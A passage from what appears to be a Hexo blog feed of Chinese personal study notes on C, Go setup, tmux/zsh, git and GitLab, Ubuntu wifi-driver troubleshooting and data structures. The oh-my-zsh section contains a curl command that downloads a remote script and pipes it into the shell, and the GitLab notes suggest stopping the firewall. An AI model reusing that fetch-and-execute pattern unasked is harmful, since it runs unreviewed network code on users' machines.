id="标准化输出"><a href="#标准化输出" class="headerlink" title="标准化输出"></a>标准化输出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;\n&quot;);//换行</span><br><span class="line">printf(&quot;%d&quot;,num);//十进制显示</span><br></pre></td></tr></table></figure><h2 id="预编译指令"><a href="#预编译指令" class="headerlink" title="预编译指令"></a>预编译指令</h2><ul><li>include是预编译指令</li><li>预编译指令是不需要加上分号的，加上也不影响执行</li><li>include可以包含任意类型可以.h,.c,.cpp</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang1</title>
      <link href="/2019/08/29/golang1/"/>
      <url>/2019/08/29/golang1/</url>
      
        <content type="html"><![CDATA[<h1 id="golang"><a href="#golang" class="headerlink" title="golang"></a>golang</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>不建议用sudo apt install 安装，因为版本太老了</li><li><a href="https://golang.google.cn/">官网</a></li><li>建议安装地址 &#x2F;usr&#x2F;local&#x2F;解压会自动建一个go文件夹</li><li>tar -C &#x2F;usr&#x2F;local -xzf go1.12.9.linux-amd64.tar.gz</li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>之前安装了gcc 所以配置时默认的是这个老版本go</li><li>用go version查看当前版本</li><li>用go env 查看go的运行环境</li><li>用which go 查看go的可执行文件位置</li><li>用whereis go 查看用多少go文件地址</li><li>配置环境在.bashrc中<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># go path</span><br><span class="line">export GOPATH=$HOME/go</span><br><span class="line">export GOROOT=/usr/local/go</span><br><span class="line">export PATH=$PATH:$GOROOT/bin:$GOPATH/bin</span><br></pre></td></tr></table></figure></li><li>网上说GOROOT和GOPATH地址不能一样</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> golangconfig，golanginstall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux_zsh_ranger</title>
      <link href="/2019/08/29/tmux-zsh-ranger/"/>
      <url>/2019/08/29/tmux-zsh-ranger/</url>
      
        <content type="html"><![CDATA[<h1 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>terminal multiplexer</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/shellsoftware</span><br><span class="line">cd ~/shellsoftware</span><br><span class="line">git clone https://github.com/tmux/tmux.git</span><br><span class="line">cd tmux</span><br><span class="line">sh autogen.sh</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>|server|服务器。输入tmux命令就开启一个服务器|<br>|-:-|-:-|<br>|session|会话。一个服务器可以包含多个会话|<br>|window|窗口。一个会话可以包含多个窗口|<br>|panel|面板。一个窗口可以包含多个面板|</p><h2 id="基本操作-指令）"><a href="#基本操作-指令）" class="headerlink" title="基本操作(+指令）"></a>基本操作(<C-b>+指令）</h2><p>|开启会话|tmux new -s <session-name>|<br>|-:-|-:-|<br>|断开会话|+d|<br>|显示已有会话|tmux ls|<br>|连接指定会话|tmux a -t 指定会话名|<br>|关闭会话|tmux kill-session -t 指定会话名|<br>|关闭所有会话|tmux kill-server|</p><ul><li>Ctrl+b 激活控制台；此时以下按键生效</li><li>系统操作<ul><li>? 列出所有快捷键；按q返回</li><li>d 脱离当前会话；这样可以暂时返回Shell界面，输入tmux attach能够重新进入之前的会话</li><li>D 选择要脱离的会话；在同时开启了多个会话时使用</li><li>Ctrl+z 挂起当前会话</li><li>r 强制重绘未脱离的会话</li><li>s 选择并切换会话；在同时开启了多个会话时使用</li><li>: 进入命令行模式；此时可以输入支持的命令，例如kill-server可以关闭服务器</li><li>[ 进入复制模式；此时的操作与vi&#x2F;emacs相同，按q&#x2F;Esc退出</li><li>~ 列出提示信息缓存；其中包含了之前tmux返回的各种提示信息</li></ul></li><li>窗口操作 <ul><li>c 创建新窗 &amp; 关闭当前窗口</li><li>数字键 切换至指定窗口</li><li>p 切换至上一窗口</li><li>n 切换至下一窗口</li><li>l 在前后两个窗口间互相切换</li><li>w 通过窗口列表切换窗口</li><li>, 重命名当前窗口；这样便于识别</li><li>. 修改当前窗口编号；相当于窗口重新排序</li><li>f 在所有窗口中查找指定文本</li></ul></li><li>面板操作<ul><li>” 将当前面板平分为上下两块</li><li>% 将当前面板平分为左右两块</li><li>x 关闭当前面板</li><li>! 将当前面板置于新窗口；即新建一个窗口，其中仅包含当前面板</li><li>Ctrl+方向键 以1个单元格为单位移动边缘以调整当前面板大小</li><li>Alt+方向键 以5个单元格为单位移动边缘以调整当前面板大小</li><li>Space 在预置的面板布局中循环切换；依次包括even-horizontal、even-vertical、main-horizontal、main-vertical、tiled</li><li>q 显示面板编号</li><li>o 在当前窗口中选择下一面板方向键移动光标以选择面板</li><li>{ 向前置换当前面板</li><li>} 向后置换当前面板</li><li>Alt+o 逆时针旋转当前窗口的面板</li><li>Ctrl+o 顺时针旋转当前窗口的面板</li></ul></li></ul><h1 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h1><h2 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h2><ul><li>一个比较流行的shell窗口</li></ul><h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zsh</span><br><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>由于配置文件大都需要改还是应该在刚刚装系统时配置zsh</li><li>.zshrc在用户家目录下</li></ul><h1 id="ranger"><a href="#ranger" class="headerlink" title="ranger"></a>ranger</h1><h2 id="用处-1"><a href="#用处-1" class="headerlink" title="用处"></a>用处</h2><ul><li>一个可视化目录管理工具</li></ul><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ul><li>类似vim的操作</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> tmux, zsh, ranger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git3</title>
      <link href="/2019/08/24/git3/"/>
      <url>/2019/08/24/git3/</url>
      
        <content type="html"><![CDATA[<h1 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h1><h2 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h2><ol><li>切换到要修改的分支（被合并，增加新内容）上git checkout[老内容分支]</li><li>执行merge命令git merge[新内容分支]</li></ol><h3 id="产生冲突"><a href="#产生冲突" class="headerlink" title="产生冲突"></a>产生冲突</h3><ul><li>打开冲突文件，head到等号是当前分支内容，等号到新内容分支名为冲突修改内容</li><li>解决步骤<ul><li>删除不想要的内容</li><li>git add 文件名</li><li>git commit -m “修改内容” 注意这里现在不能加文件名否则会报错</li></ul></li></ul><h1 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h1><ul><li>一种加密算法<ul><li>将明文转换为密文</li></ul></li></ul><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>不管输入数据的数据量有多大，输入同一个哈希算法，得到的加密结果长度固定</li><li>哈希算法确定，输入数据确定，输出数据也是确定的</li><li>哈希算法确定，输入数据有变化，输出数据一定有变化而且可能有很大的变化</li><li>哈希算法不可逆</li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>MD5</li><li>SHA1（字母不区分大小写，应该是代表十六进制数）</li><li>CRC32</li></ul><h2 id="与git关联"><a href="#与git关联" class="headerlink" title="与git关联"></a>与git关联</h2><ul><li>Git底层采取SHA-1 算法</li><li>哈希算法可以用来校验文件是否修改</li></ul><h1 id="git-与-svn-区别"><a href="#git-与-svn-区别" class="headerlink" title="git 与 svn 区别"></a>git 与 svn 区别</h1><ul><li>svn为集中式管理，每次保留修改部分，不存在修改部分</li><li>git 把数据看做是小型文件系统的快照，每次提交更新都会对全部文件制作一个快照保存快照索引，如果文件没有修改git不再重新储存，只保留指针指向之前文件<ul><li>提交对象及其父对象形成链表</li></ul></li><li>git的快照<ul><li>自身哈希</li><li>commit</li><li>tree</li><li>parent</li><li>author</li><li>commiter</li></ul></li></ul><h1 id="git-如何管理分支"><a href="#git-如何管理分支" class="headerlink" title="git 如何管理分支"></a>git 如何管理分支</h1><ul><li>类似链表结构</li><li>首个版本为root</li><li>开始HEAD指针指向master指针</li><li>若有新的分支则新建一个新的指针</li><li>切换分支只是改变HEAD指针位置</li></ul><h1 id="github"><a href="#github" class="headerlink" title="github"></a>github</h1><ul><li>创建账号</li><li>创建仓库</li><li>仓库网址保存<ul><li>git remote add origin(保存的仓库网址) 网址（url）将仓库网址起别名</li><li>git remote -v 查看当前所有的网址别名</li></ul></li><li>将新成员加入项目，点击setting，选择Collaborators，填写新成员github账号发送邀请，新成员接收到邀请后点击接受，新成员就可push内容到远端库了</li></ul><h1 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h1><ul><li>git push 网址 本地库提交分支<ul><li>第一次可能遇到https问题。需要删掉https试一次，在加上https试一次，然后就可以用啦</li><li>目的是将本地库推送到远程库</li></ul></li><li>新成员不能将本地库内容推送到远程库</li></ul><h1 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h1><ul><li>git clone 网址<ul><li>会完整的把远程库克隆到当前文件夹下的仓库名文件夹</li><li>创建远程库的地址别名</li><li>初始化本地库</li></ul></li><li>新成员可以克隆内容到本地库，可以在本地库进行修改，但是不能上传到远程库</li></ul><h1 id="pull拉取"><a href="#pull拉取" class="headerlink" title="pull拉取"></a>pull拉取</h1><ul><li>git pull 相当于 git fetch + git merge 的合并</li><li>git fetch 【远程库地址别名】【远程分支名】<ul><li>不改变本地文件，只是下载到本地</li><li>下载的文件到了git checkout origin&#x2F;master 分支上</li><li>用于查看改变而不着急更改</li></ul></li><li>以上都是读操作不需要确定身份</li><li>因为拉取有merge过程可能出现冲突问题，所以可以拆开来用</li></ul><h1 id="pull文件冲突"><a href="#pull文件冲突" class="headerlink" title="pull文件冲突"></a>pull文件冲突</h1><ul><li>当git push 文件时远程库有了新的版本，这时的push操作是不会生效的。</li><li>只能git pull 文件，当文件冲突时，会出现XXX|merge分支，这个分支操作和之前的分支冲突解决办法相同，选择删除冲突的内容。同样的git add 之后不带文件名的git commit</li></ul><h1 id="跨团队协作"><a href="#跨团队协作" class="headerlink" title="跨团队协作"></a>跨团队协作</h1><ul><li>以其他团队成员身份希望参与他人的工程开发，可以用fork的方式将项目复制到自己的目录下，</li><li>可以clone到自己的本地</li><li>也可以push到自己的远程库</li><li>将自己的改好的项目传回他人的团队<ul><li>github上pull request，进入后点击create pull request</li><li>类似发封邮件给项目创建人</li><li>项目创建人查看pull request，可以回复comment，可以commit看对方提交了什么，可以看files changed 具体做的文件修改。对代码进行审核</li><li>如果没问题，merge pull request合并代码，填写confirm merge填写本次操作的日志信息</li></ul></li></ul><h1 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h1><ul><li>命令行下输入ssh-keygen -t rsa -C 邮箱地址</li><li>生成SSH的目录，进入到目录中，可以看到两个文件 <ul><li>id_rsa</li><li>id_rsa.pub <ol><li>内容复制，</li><li>进入github</li><li>进入personal settings </li><li>进入SSH and GPG keys</li><li>title随意，keys粘贴复制内容</li></ol></li></ul></li><li>通过 git remote add 地址别名 SSH地址</li><li>git remote -v 查看SSH编码</li><li>git push SSH的别名 master 推送至远程库（可以不填写账号密码）</li></ul><h1 id="git的图形界面"><a href="#git的图形界面" class="headerlink" title="git的图形界面"></a>git的图形界面</h1><ul><li>eclipse 内置了git插件</li></ul><h1 id="eclipse-操作"><a href="#eclipse-操作" class="headerlink" title="eclipse 操作"></a>eclipse 操作</h1><h2 id="为项目初始化git"><a href="#为项目初始化git" class="headerlink" title="为项目初始化git"></a>为项目初始化git</h2><ul><li>工程上点右键选Team</li><li>选share_project</li><li>选git</li><li>use or create repository in parent folder of project 勾选</li><li>选中项目</li><li>之后点击create repository</li><li>finish</li></ul><h2 id="为项目提交"><a href="#为项目提交" class="headerlink" title="为项目提交"></a>为项目提交</h2><ul><li>工程上右键选Team</li><li>选commit</li><li>显示三个部分<ul><li>unstaged changes</li><li>staged changes</li><li>commit message</li></ul></li><li>eclipse中会有一些特定文件是eclipse中管理本地库的隐藏文件，这些文件不需要通过git上传，因为不同版本的eclipse用的特定文件也不同<ul><li>.classpath</li><li>.project</li><li>.settings</li><li>target</li></ul></li></ul><h2 id="git的忽略文件"><a href="#git的忽略文件" class="headerlink" title="git的忽略文件"></a>git的忽略文件</h2><ul><li>url github.com&#x2F;github&#x2F;gitignore</li><li>例如java 参照网址中机制，<ol><li>在用户家目录中找到.gitconfig文件放在一个目录下方便一起修改</li><li>新建复制网站中的代码，命名按照github上的仓库名</li><li>除了这些eclipse中还要忽略<ul><li>.classpath</li><li>.project</li><li>.settings</li><li>target</li></ul></li><li>在.gitconfig中加入下面代码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">excludesfile = ~/java.gitconfig</span><br></pre></td></tr></table></figure></li></ol></li></ul><h2 id="eclipse-项目提交"><a href="#eclipse-项目提交" class="headerlink" title="eclipse 项目提交"></a>eclipse 项目提交</h2><ul><li>工程右键选Team</li><li>选择add to index</li><li>之后在选择commit提交</li></ul><h2 id="eclipse推送到远程库"><a href="#eclipse推送到远程库" class="headerlink" title="eclipse推送到远程库"></a>eclipse推送到远程库</h2><ul><li>Team </li><li>remote</li><li>push</li><li>填写url</li></ul><h2 id="远程库工程放到本地"><a href="#远程库工程放到本地" class="headerlink" title="远程库工程放到本地"></a>远程库工程放到本地</h2><h3 id="高版本操作"><a href="#高版本操作" class="headerlink" title="高版本操作"></a>高版本操作</h3><ul><li>import 导入工程</li><li>git&#x2F;projects from git</li><li>clone url</li><li>Destination 选择eclipse工作区目录</li><li>import as general project</li></ul><h3 id="低版本操作"><a href="#低版本操作" class="headerlink" title="低版本操作"></a>低版本操作</h3><ul><li>前面的都一样，不能导入到当前工作区目录，只能导到工作区以外的目录中</li><li>Destination 非eclipse工作区目录</li><li>之后的步骤相同</li></ul><h2 id="eclipse-解决冲突"><a href="#eclipse-解决冲突" class="headerlink" title="eclipse 解决冲突"></a>eclipse 解决冲突</h2><ul><li>各自提交到本地库没问题</li><li>如果推送到同一远程库，后推送会出现冲突</li><li>同样的先pull文件之后处理冲突，也可以用merge tool查看多文件区别</li><li>处理好后正常推送远程库即可</li></ul><h2 id="eclipse创建or切换分支"><a href="#eclipse创建or切换分支" class="headerlink" title="eclipse创建or切换分支"></a>eclipse创建or切换分支</h2><ul><li>Team</li><li>switch to </li><li>New branch or other</li></ul><h1 id="git工作流"><a href="#git工作流" class="headerlink" title="git工作流"></a>git工作流</h1><h2 id="集中式工作流"><a href="#集中式工作流" class="headerlink" title="集中式工作流"></a>集中式工作流</h2><ul><li>类SVN无分支</li></ul><h2 id="gitflow工作流"><a href="#gitflow工作流" class="headerlink" title="gitflow工作流"></a>gitflow工作流</h2><ul><li>新功能开发在master下的develop分支上进行</li><li>develop下还有feature_XX等分支负责具体功能开发</li><li>bug在master下hotfix下进行修复并且修复后尽快合并会master分支和develop分支</li><li>上线前进行最后测试需要建立一个release分支测试。</li><li>将develop分支合并至release上且有bug直接修复</li><li>上线时合并到master分支上和develop分支上</li></ul><h2 id="froking工作流"><a href="#froking工作流" class="headerlink" title="froking工作流"></a>froking工作流</h2><ul><li>常用于项目外人员开发</li></ul><h1 id="gitlab-服务操作"><a href="#gitlab-服务操作" class="headerlink" title="gitlab 服务操作"></a>gitlab 服务操作</h1><ul><li>初始化gitlab<ul><li>gitlab-ctl reconfigure</li></ul></li><li>启动gitlab<ul><li>gitlab-ctl start</li></ul></li><li>停止gitlab<ul><li>gitlab-ctl stop</li></ul></li></ul><h1 id="浏览器访问"><a href="#浏览器访问" class="headerlink" title="浏览器访问"></a>浏览器访问</h1><ul><li>可能需要停掉防火墙<ul><li>service firewall stop</li></ul></li><li>gitlab设置密码</li><li>之后类似github操作</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wirelessproblem</title>
      <link href="/2019/08/21/wirelessproblem/"/>
      <url>/2019/08/21/wirelessproblem/</url>
      
        <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>打开电脑发现无法联无线网，使用以下命令检查：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure><ol><li>发现两个接口：eno1和lo,并没有发现无线网卡</li><li>退出Ubuntu系统，进入win10依旧未发现无线网卡，怀疑无线网卡损坏。</li><li>外出购买内置无线网卡rtl8723be<ul><li>安装后win10系统默认关闭wifi，睡眠后开启wifi接口可打开，重启后又关闭。尝试用笔记本默认硬件开关F12和fn+ F12，只能切换飞行模式和wifi，但是wifi仍处于关闭状态</li><li>Ubuntu系统处于飞行模式并且显示wifi硬件开关关闭。尝试笔记本默认wifi硬件开关，按键无效或终端输入~符号。</li></ul></li><li>ubuntu系统下尝试下列命令解决问题<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rfkill list</span><br></pre></td></tr></table></figure>显示 soft blocked no<br>hard blocked yes<br>说明硬件开关阻塞<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rfkill unblock all</span><br><span class="line">rfkill list</span><br></pre></td></tr></table></figure>未造成任何改变，此方法仅适合与开关软件阻塞<br>尝试挂起系统解决问题<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pm-suspend</span><br></pre></td></tr></table></figure>找不到pm命令，连接网线，通过有线网络下载pm<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install pm</span><br></pre></td></tr></table></figure>断开有线网络<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pm-suspend</span><br></pre></td></tr></table></figure>回车唤起系统，发现wifi正常使用。<br>但是每次开机后挂起很麻烦，所以寻找其他解决办法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe -r rtl8723be</span><br><span class="line">sudo modprobe rtl8723be</span><br></pre></td></tr></table></figure>尝试开闭模块重新激活，失败<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/modprobe.d/blacklist.conf</span><br><span class="line">最后增加</span><br><span class="line">blacklist hp-wmi</span><br><span class="line">....</span><br><span class="line">等一系列网上方法</span><br></pre></td></tr></table></figure>失败，重启后问题仍无法解决<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">github上更新rtl系列网卡驱动</span><br><span class="line">依照README提示安装相关的kernel部件</span><br><span class="line">git clone ....</span><br><span class="line">cd 克隆的文件夹</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">sudo modprobe -r rtl8723be</span><br><span class="line">sudo modprobe rtl8723be</span><br><span class="line">sudo vim /etc/modprobe.d/rtl8723be.conf</span><br><span class="line">依照网上配置</span><br></pre></td></tr></table></figure>原来可以链接的wifi显示连接失败，需要激活<br>重启后问题未得到解决<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入clone的文件夹</span><br><span class="line">sudo make uninstall</span><br></pre></td></tr></table></figure>卸载后重启可以通过挂起联网</li></ol><hr><h1 id="问题解决方案"><a href="#问题解决方案" class="headerlink" title="问题解决方案"></a>问题解决方案</h1><ul><li>只有通过挂起解决</li><li>熟悉特别linux系统前不打算再尝试解决这个问题</li><li>已购买原相同无线内置网卡尝试解决问题</li><li>下次ubuntu系统不要使用rtl（瑞昱系列的网卡）</li><li>熟悉使用以下linux命令<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo pm-suspend 系统挂起</span><br><span class="line">rfkill list无线设备列表</span><br><span class="line">rfkill unblock all不阻塞所有</span><br><span class="line">rfkill block all阻塞所有</span><br><span class="line">ifconfig -a查看所有端口</span><br><span class="line">sudo lshw -C Network查看无线设备</span><br><span class="line">sudo lsmod查看在用模块</span><br><span class="line">sudo modprobe 修改在用模块</span><br><span class="line">makemake installmake uninstall编译式的安装和卸载</span><br><span class="line">git clone 的使用</span><br><span class="line"></span><br><span class="line">/etc/modprobe.d/下的文件的修改</span><br><span class="line">blacklist.conf用于增加黑名单模块，防止开机启动</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="仍存在问题"><a href="#仍存在问题" class="headerlink" title="仍存在问题"></a>仍存在问题</h1><ul><li>不能直接开启</li><li>挂起后不稳定，一定时间后掉线</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> wifi, hard_block,airplane_mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git2</title>
      <link href="/2019/08/19/git2/"/>
      <url>/2019/08/19/git2/</url>
      
        <content type="html"><![CDATA[<h1 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h1><h2 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h2><ul><li>用于查看仓库中的文件状态<ul><li>在哪个分支</li><li>是否有提交</li><li>是否有新的文件，是否有追踪过这个文件，是否更改过</li></ul></li><li>查看工作区和缓存区内容</li></ul><h2 id="git-add-文件名"><a href="#git-add-文件名" class="headerlink" title="git add 文件名"></a>git add 文件名</h2><ul><li>用于追踪文件</li><li>用于将工作区的内容提交到暂存区</li></ul><h2 id="git-commit-文件名"><a href="#git-commit-文件名" class="headerlink" title="git commit 文件名"></a>git commit 文件名</h2><ul><li>用于提交文件</li><li>-a 用于modified文件的提交</li><li>-m “”   引号内写下修改内容，避免打开vim编辑器添加</li><li>将暂存区内容传到本地库</li></ul><h2 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h2><ul><li>查看历史版本</li><li>–pretty&#x3D;oneline以简洁的方式显示</li><li>–oneline以最简单方式显示只显示head指针的过去版本，而不显示head指向的新版本</li><li>多屏显示类似linux中的less显示</li></ul><h2 id="git-relog"><a href="#git-relog" class="headerlink" title="git relog"></a>git relog</h2><ul><li>显示head指针需要移动多少步才能达到想要的版本</li></ul><h2 id="git-reset-–hard-哈希索引值"><a href="#git-reset-–hard-哈希索引值" class="headerlink" title="git reset –hard 哈希索引值"></a>git reset –hard 哈希索引值</h2><ul><li>选择你想要到的版本</li></ul><h2 id="git-reset-–hard-HEAD"><a href="#git-reset-–hard-HEAD" class="headerlink" title="git reset –hard HEAD^"></a>git reset –hard HEAD^</h2><ul><li>回退到之前版本，取决于^的数，数量表示回退补数（不建议多步）</li></ul><h2 id="git-reset-–hard-HEAD-步数"><a href="#git-reset-–hard-HEAD-步数" class="headerlink" title="git reset –hard HEAD~步数"></a>git reset –hard HEAD~步数</h2><ul><li>显示你要后退的版本步数</li></ul><h2 id="git-help-reset"><a href="#git-help-reset" class="headerlink" title="git help reset"></a>git help reset</h2><ul><li>reset 的帮助</li></ul><h2 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h2><ul><li>–soft仅仅在本地库移动HEAD指针</li><li>–mixed<ul><li>在本地库移动HEAD指针</li><li>重置暂存区</li></ul></li><li>–hard<ul><li>在本地库移动HEAD指针</li><li>重置暂存区</li><li>重置工作区</li></ul></li><li>找回文件的一种方式，回退到之前的版本，把之前版本的文件恢复，不过前提必须在文件存在时的状态提交到了本地库</li></ul><h2 id="git-diff-文件名"><a href="#git-diff-文件名" class="headerlink" title="git diff 文件名"></a>git diff 文件名</h2><ul><li>将工作区文件与暂存区文件进行比较</li><li>红色表示删除过</li><li>前面有加号表示添加的内容</li></ul><h2 id="git-diff-【本地库中的历史版本】【文件名】"><a href="#git-diff-【本地库中的历史版本】【文件名】" class="headerlink" title="git diff 【本地库中的历史版本】【文件名】"></a>git diff 【本地库中的历史版本】【文件名】</h2><ul><li>将工作区中的文件和本地库历史记录进行比较</li><li>不带文件名比较多个文件</li></ul><hr><h1 id="本地的仓库分类"><a href="#本地的仓库分类" class="headerlink" title="本地的仓库分类"></a>本地的仓库分类</h1><h2 id="本地库"><a href="#本地库" class="headerlink" title="本地库"></a>本地库</h2><ul><li>历史版本<ul><li>通过head指针指示当前处于的版本</li></ul></li></ul><h2 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a>暂存区</h2><ul><li>临时存储</li></ul><h2 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h2><ul><li>写代码</li></ul><hr><h1 id="git的分支"><a href="#git的分支" class="headerlink" title="git的分支"></a>git的分支</h1><ul><li>从多个分支对一个项目进行开发</li></ul><h2 id="master"><a href="#master" class="headerlink" title="master"></a>master</h2><ul><li>主要分支</li></ul><h2 id="feature"><a href="#feature" class="headerlink" title="feature_***"></a>feature_***</h2><ul><li>刚开始内容和master一样</li><li>之后的内容是独立的分支，在合并之前不会对master和其他分支有影响</li><li>作为一个独立的功能进行开发</li></ul><h2 id="hot-fix分支"><a href="#hot-fix分支" class="headerlink" title="hot_fix分支"></a>hot_fix分支</h2><ul><li>用于修复bug</li></ul><h2 id="git-branch-v"><a href="#git-branch-v" class="headerlink" title="git branch -v"></a>git branch -v</h2><ul><li>查看现有分支</li></ul><h2 id="git-branch-分支名"><a href="#git-branch-分支名" class="headerlink" title="git branch 分支名"></a>git branch 分支名</h2><ul><li>新建分支</li><li>一般以feature_***形式命名</li><li>修复bug分支一般以hot_fix命名</li></ul><h2 id="git-checkout-分支名"><a href="#git-checkout-分支名" class="headerlink" title="git checkout 分支名"></a>git checkout 分支名</h2><ul><li>用于切换分支</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>datastructure1</title>
      <link href="/2019/08/18/datastructure1/"/>
      <url>/2019/08/18/datastructure1/</url>
      
        <content type="html"><![CDATA[<h1 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h1><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>|数据结构|优点|缺点|<br>|-:-|-:-|-:-|<br>|数组|插入快，如果知道下标可以非常快的存取|查找慢，删除慢，大小固定|<br>|有序数组|比无序数组查找快|删除和插入慢，大小固定|<br>|栈|提供后进先出方式的存取|存取其他项很慢|<br>|队列|提供先进先出方式存取|存取其他项很慢|<br>|链表|插入快，删除快|查找慢|<br>|二叉树|查找、插入、删除都快（如果树平衡}|删除算法复杂|<br>|红黑树|查找、插入、删除都快。树总是平衡|算法复杂|<br>|2-3-4数|查找、插入、删除都快。树总是平衡，类似的树对磁盘存储有用|算法复杂|<br>|哈希表|如果关键字已知则存取极快，插入快|删除慢，如果不知道关键字则存取很慢，对存储空间使用不充分|<br>|堆|插入，删除快，对大量数据项的存取很快|对其他数据项存取慢|<br>|图|对现实世界建模|有些算法很复杂|</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li>数据结构除了数组外都可以被认为是抽象数据结构（ADT）</li><li>常用操作<ul><li>插入</li><li>寻找数据项</li><li>删除</li></ul></li></ul><h1 id="软件工程简述"><a href="#软件工程简述" class="headerlink" title="软件工程简述"></a>软件工程简述</h1><ul><li>软件生命周期<ul><li>分析</li><li>设计</li><li>验证</li><li>编码</li><li>测试</li><li>生产</li><li>维护</li></ul></li></ul><h1 id="C与Java的区别"><a href="#C与Java的区别" class="headerlink" title="C与Java的区别"></a>C与Java的区别</h1><ul><li>Java无指针</li><li>Java有内存回收机制</li><li>Java输出不用预处理，System.out.println可以直接用。print 